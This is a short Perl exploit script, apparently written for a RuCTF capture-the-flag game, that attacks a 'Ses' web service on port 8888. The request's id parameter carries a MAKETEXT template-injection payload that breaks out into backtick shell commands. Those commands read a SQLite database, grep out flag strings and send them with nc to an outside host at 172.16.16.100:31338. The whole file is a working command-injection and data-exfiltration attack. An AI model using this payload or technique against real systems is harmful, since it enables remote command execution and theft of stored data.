#!/usr/bin/perl
use strict;
use warnings;
use JSON;
use Ses::SesAPI;

sub DEBUG{1};

my $endpoint = shift or print_usage();
my $session  = shift or print_usage();
my $params = { 
    id => q!%MAKETEXT{"test [_1] secondtest\\'}; `strings db/ses.sqlite | grep ructf | nc 172.16.16.100 31338`; { #" args="tmp"}%!
};

if (DEBUG) {
    print  "#------------------> REQUEST ----------------------------\n";
    print  "# Endpoint:  $endpoint\n";
    print  "# Session:   $session\n";
    printf "# Params.id: %s\n",$params->{id};
    print  "#------------------< REPLY ------------------------------\n";
}

my $api = new Ses::SesAPI("http://$endpoint:8888","session=$session");
my ($ok,$data,$status) = $api->sendRequest("error",$params);

printf "# Status: %s\n", $status;
print  $data.$/;

#####################################################################################################################

sub print_usage {
    print <<'END';

  Usage: spl0it.pl <Endpoint> <Session>

END
    exit 0;
}
